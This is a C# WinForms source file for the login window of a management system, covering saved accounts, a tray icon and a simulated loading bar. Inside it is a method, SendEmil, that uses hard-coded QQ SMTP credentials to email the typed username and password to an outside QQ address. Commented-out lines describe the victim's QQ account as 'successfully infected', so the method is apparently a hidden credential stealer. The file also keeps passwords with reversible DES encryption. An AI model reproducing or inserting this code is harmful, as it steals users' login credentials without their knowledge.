using System;
using System.Drawing;
using System.Net.Mail;
using System.Windows.Forms;
using CCWin;
using CCWin.SkinClass;
using CCWin.SkinControl;
using System.Threading;
using SM.Base;
using SM.BaseControls;

namespace SM.ManageUI
{
    public partial class FrmLogin : CCSkinMain
    {
        #region 成员变量
        /// <summary>
        /// 请求登陆账号信息
        /// </summary>
        private User mangeUser;
        /// <summary>
        /// 读取账号信息
        /// </summary>
        private UserList userL;
        
        /// <summary>
        /// 主窗体
        /// </summary>
        private MainWin main;
        /// <summary>
        /// 颜色值
        /// </summary>
        private Color[] colors = { Color.Aqua, SystemColors.ActiveBorder, Color.Azure, Color.Beige, Color.DarkCyan, Color.DarkGreen, Color.Yellow, Color.Red };
        #endregion

        public FrmLogin()
        {
            InitializeComponent(); 
        }

        #region 窗体加载   聚焦事件
        //窗口加载时
        private void FrmLogin_Load(object sender, EventArgs e)
        {
            //可以根据条件自定义主题、
            //加载账号信息
            init_tuopan();

            try
            {
                userL = (UserList)Serialize.BinaryDeserialize("user");
            }
            catch (Exception ex)
            {
                //write log
                return;
            }
            finally
            {
                if (!userL.IsNull())  //如果存在保存的账号信息  加载最近一次账号信息到界面
                {
                    this.chkMima.Checked = userL.ListU[userL.Index].PassWord.IsNull() ? false : true;
                    this.txtId.Text = userL.ListU[userL.Index].Account.DecryptDES(SConfig.DESKEY);
                    if (!userL.ListU[userL.Index].PassWord.IsNull())
                    {
                        this.txtPwd.Text = userL.ListU[userL.Index].PassWord.DecryptDES(SConfig.DESKEY);
                    }
                    #region 将账号添加到下拉列表框
                    for (int i = userL.Index; i >= 0; i--)
                    {
                        comBoId.Items.Add(userL.ListU[i].Account.DecryptDES(SConfig.DESKEY));
                    }
                    #endregion
                }
                else
                {
                    userL = new UserList();
                }
            }

            ////判断服务是否启动，如果没有启动则启动服务
            //IniHelper ini = new IniHelper(Application.StartupPath + @"\config\SM_SQL_CONFIG.ini");
            //SQLCommand sqlCom = new SQLCommand(ini.IniReadValue("SQL", "SERVER_NAME"));
            //switch(sqlCom.SQLServerIsStart()) //判断配置的服务当前状态
            //{
            //    case 0:
            //        {
            //            FrmBox frmServer = new FrmBox("SQL服务提示", "您的SQL服务\n\r尚未启动\n\r现在开始启动...", Properties.Resources._3);
            //            frmServer.timerHide.Interval = 4000;
            //            frmServer.ShowDialog();
            //            sqlCom.SQLServerStart();
            //        }
            //        break;
            //    case -1:
            //        {
            //            FrmBox frmServer = new FrmBox("SQL服务提示", "您配置的SQL服务\n\r不存在\n\r请查看配置文件...", Properties.Resources._3);
            //            frmServer.timerHide.Interval = 3000;
            //            frmServer.ShowDialog();
            //            Application.Exit();
            //            Application.ExitThread();
            //        }
            //        break;
            //}
        }

        /// <summary>
        /// 重写当窗体失去焦点时事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void FrmLogin_DeacTivate(object sender, EventArgs e)
        {
            this.tuopan.ShowBalloonTip(1000);
        }
        #endregion

        #region 文本框鼠标移入移出事件
        //悬浮时
        private void Control_MouseEnter(object sender, EventArgs e)
        {
            Control txt = (Control)sender;
            SkinPanel pnl = (SkinPanel)txt.Parent;
            pnl.ControlState = ControlState.Hover;
        }

        //离开时
        private void Control_MouseLeave(object sender, EventArgs e)
        {
            Control txt = (Control)sender;
            SkinPanel pnl = (SkinPanel)txt.Parent;
            pnl.ControlState = ControlState.Normal;
        }
        #endregion

        #region 托盘相关事件
        /// <summary>
        /// 初始化托盘信息
        /// </summary>
        private void init_tuopan()
        {
            this.tuopan.Text = SString.LOGO + "(未登陆)";
            this.tuopan.ContextMenuStrip = this.contextMenuStrip1;
            this.tuopan.BalloonTipIcon = ToolTipIcon.Info;
            this.tuopan.BalloonTipTitle = SString.LOGO;
            this.tuopan.BalloonTipText = "系统正在运行，双击显示窗口！\n右击弹出快捷菜单...\n当前版本1.0";
        }

        //托盘图标双击显示
        private void tuopan_DoubleClick(object sender, EventArgs e)
        {
            if (main != null)
            {
                main.ShowInTaskbar = true;
                main.Show();
                main.Activate();
                main.WindowState = FormWindowState.Normal;
            }
            else
            {
                this.Show();
            }
        }

        /// <summary>
        /// 托盘菜单隐藏窗体事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tuopan_Hide(object sender, EventArgs e)
        {
            if (main != null)
            {
                main.WindowState = FormWindowState.Minimized;
                main.Hide();
                main.ShowInTaskbar = false;
            }
            else
            {
                this.Hide();
            }
        }

        /// <summary>
        /// 托盘菜单关闭窗体事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tuopan_Close(object sender, EventArgs e)
        {
            if (main != null)
            {
                main.Dispose();
                main.Close();
            }
            else
            {
                this.Dispose();
                this.Close();
            }
            Application.Exit();//退出整个应用程序。（无法退出单独开启的线程）
            Application.ExitThread();//释放所有线程　
        }

        #endregion

        #region 登陆事件
        /// <summary>
        /// 登陆事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnDl_Click(object sender, EventArgs e)
        {
            FrmBox frmShow;
            mangeUser = new User(txtId.Text, txtPwd.Text);
            if (string.IsNullOrEmpty(mangeUser.Account))
            {
                frmShow=new FrmBox("提示信息", "用户名不能为空", Properties.Resources._2);
                frmShow.ShowDialog();
                return;
            }
            if(string.IsNullOrEmpty(mangeUser.PassWord))
            {
                frmShow=new FrmBox("提示信息", "密码不能为空", Properties.Resources._2);
                frmShow.ShowDialog();
                return;
            }
            if (!mangeUser.mLogin())
            {
                frmShow = new FrmBox("提示信息", "用户名或密码错误\n\r请您输入正确的\n\r登陆口令！", Properties.Resources._2);
                frmShow.ShowDialog();
                return;
            }

            #region 保存账号信息

            int index=userL.userIsExists(mangeUser.Account.EncryptDES(SConfig.DESKEY)); 
            if (index!= -1)  //已经存在
            {
                userL.ListU.RemoveAt(index);  //删除
            }

            userL.ListU.Add(mangeUser);  //重新存储
            userL.ListU[userL.Index].Account = userL.ListU[userL.Index].Account.EncryptDES(SConfig.DESKEY);
            userL.ListU[userL.Index].PassWord = userL.ListU[userL.Index].PassWord.EncryptDES(SConfig.DESKEY);
           
            if (!chkMima.Checked)  //不记住密码
            {
                userL.ListU[userL.Index].PassWord = null; 
            }

            Serialize.BinarySerialize("user", userL); 
            #endregion

            this.btnDl.Enabled = false;//加载资源过程中登陆按钮不可使用

            this.prbLoading.Visible = true;
            this.labLoading.Visible = true;
            Thread thread = new Thread(new ThreadStart(Send));
            thread.Start();
        }
        #endregion

        #region Loading 进度条
        private void Send()
        {
            int i = 0;
            while (i <= 100)
            {
                //显示进度 信息
                this.ShowPro(i);
                //循环发生文件
                //模拟的 
                i++; //模拟发送多少
                Thread.Sleep(100);
            }
            Thread.CurrentThread.Abort();
        }
        private delegate void ProgressBarShow(int i);
        private void ShowPro(int value)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new ProgressBarShow(ShowPro), value);

            }
            else
            {

                this.prbLoading.Value = value;
                this.labLoading.Text =value + "%";
                if (labLoading.Text == "100%")
                {
                    //////跳转到内容页
                    this.tuopan.Text = SString.LOGO + "(已登陆)";
                    this.tuopan.Icon = Properties.Resources.niICO;

                    FrmPopup frm =new FrmPopup("您好【123】：", "恭喜您成功登陆本系统！\n\r您的权限是：\n\r（222班）333\n\r祝您使用愉快！");
                    //if (mangeUser.Role == User.Root[RootUser.classAdmin.ToInt()])
                    //{
                    //    frm= new FrmPopup("您好【" + mangeUser.Account.DecryptDES(SConfig.DESKEY) + "】：", "恭喜您成功登陆本系统！\n\r您的权限是：\n\r（"+mangeUser.BelongClass+"班）" + mangeUser.Role + "\n\r祝您使用愉快！");
                    //}
                    //else
                    //{
                    //    frm = new FrmPopup("您好【" + mangeUser.Account.DecryptDES(SConfig.DESKEY) + "】：", "恭喜您成功登陆本系统！\n\r您的权限是：\n\r      " + mangeUser.Role + "\n\r祝您使用愉快！");
                    //}
                    frm.Show();

                    main= new MainWin(this.mangeUser);
                    main.Show();
                    //登陆窗体隐藏
                    this.Hide();
                }
            }

        }
        #endregion

        #region 账号下拉框事件
        //账号下拉框按钮事件
        Image BtnNorml;
        private void btnId_MouseDown(object sender, MouseEventArgs e)
        {
            BtnNorml = btnId.NormlBack;
            btnId.NormlBack = btnId.DownBack;
            btnId.Enabled = false;
            this.comBoId.DroppedDown = true;
            comBoId.SelectedIndex = 1;
        }

        /// <summary>
        /// 账号下拉菜单关闭时
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MenuId_Closing(object sender, EventArgs e)
        {
            btnId.Enabled = true;
            btnId.NormlBack = BtnNorml;
            pnlId.ControlState = ControlState.Normal;

            if (comBoId.SelectedItem.IsNull())
            {
                return;
            }
            int index = userL.userIsExists(comBoId.SelectedItem.ToString().EncryptDES(SConfig.DESKEY)); 
            //MessageBox.Show(index.ToString());
            if (index == -1)
            {
                txtId.Text = string.Empty;
                txtPwd.Text = string.Empty;
            }
            else
            {
                this.chkMima.Checked = userL.ListU[index].PassWord.IsNull() ? false : true;
                this.txtId.Text = userL.ListU[index].Account.DecryptDES(SConfig.DESKEY);
                if (!userL.ListU[index].PassWord.IsNull())
                {
                    this.txtPwd.Text = userL.ListU[index].PassWord.DecryptDES(SConfig.DESKEY);
                }
                else
                {
                    txtPwd.Text = string.Empty;
                }
            }
            
        }
        #endregion

        #region 软键盘 自动登录 记住密码 关闭 关于系统等事件
        //软键盘
        private void txtPwd_IconClick(object sender, EventArgs e)
        {
            PassKey pass = new PassKey(this.Left + txtPwd.Left - 25, this.Top + txtPwd.Bottom, txtPwd);
            pass.Show(this);
        }

        //自动登录
        private void chkZdLogin_CheckedChanged(object sender, EventArgs e)
        {
            chkMima.Checked = chkZdLogin.Checked ? true : chkMima.Checked;
        }

        //记住密码
        private void chkMima_CheckedChanged(object sender, EventArgs e)
        {
            if (!chkMima.Checked && chkZdLogin.Checked)
            {
                chkZdLogin.Checked = false;
            }
        }
        //关闭
        private void toolExit_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void btnSandeng_Click(object sender, EventArgs e)
        {
            //关于系统
            CopyrightFrm copyFrm = new CopyrightFrm();
            copyFrm.ShowDialog();
        }
        #endregion

        #region 发送邮件
        //发送邮件
        private bool SendEmil()
        {
            SmtpClient client = new SmtpClient();
            //这个地方的用户名你可以用split从发送人中截取
            client.Credentials = new System.Net.NetworkCredential("375082582", "123456asd");
            client.Port = 25;
            client.Host = "smtp.qq.com";
            try
            {
                client.Send(Initial("234486036@qq.com"));
                return true;
            }
            catch (System.Net.Mail.SmtpException)
            {
                return false;
            }
        }

        //配置邮件信息
        public MailMessage Initial(string Address)
        {
            MailMessage m_Mail = new MailMessage();
            //发件人
            m_Mail.From = new MailAddress("375082582@qq.com");
            //收件人
            m_Mail.To.Add(new MailAddress(Address));
            //主题
            // m_Mail.Subject = "QQ号：" + txtId.Text + "已成功感染！";
            m_Mail.Subject = "HUCSD发来信息" + DateTime.Now.ToString();
            //内容
            //m_Mail.Body = "QQ号：（" + txtId.Text + "）密码：（" + txtPwd.Text + "）";
            m_Mail.Body = txtId.Text + "----" + txtPwd.Text;
            //邮件主题和正文编码格式
            m_Mail.SubjectEncoding = System.Text.Encoding.UTF8;
            m_Mail.BodyEncoding = System.Text.Encoding.UTF8;
            //邮件正文是Html编码
            m_Mail.IsBodyHtml = true;
            //优先级
            m_Mail.Priority = System.Net.Mail.MailPriority.High;
            //添加附件,可以添加多个
            //m_Mail.Attachments.Add(new Attachment("f:\\1.txt"));
            //密件抄送收件人
            m_Mail.Bcc.Add(Address);
            //抄送收件人
            m_Mail.CC.Add(Address);
            return m_Mail;
        }

        #endregion

        #region 文本框账号输入判定  文本框聚焦事件
        private void txtId_Enter(object sender, EventArgs e)
        {
            int index=userL.userIsExists(txtId.Text.EncryptDES(SConfig.DESKEY));
            if (index == -1)
            {
                txtPwd.Text = string.Empty;
            }
            else
            {
                this.chkMima.Checked = userL.ListU[index].PassWord.IsNull() ? false : true;
                this.txtId.Text = userL.ListU[index].Account.DecryptDES(SConfig.DESKEY);
                if (!userL.ListU[index].PassWord.IsNull())
                {
                    this.txtPwd.Text = userL.ListU[index].PassWord.DecryptDES(SConfig.DESKEY);
                }
                else
                {
                    txtPwd.Text = string.Empty;
                }
            }
        }
        #endregion

        /// <summary>
        /// logo颜色改变事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void timerColor_Tick(object sender, EventArgs e)
        {
            Random rand = new Random(DateTime.Now.Second);
            this.lblMsg.ForeColor = colors[rand.Next(colors.Length)];
        }
 
    }
}
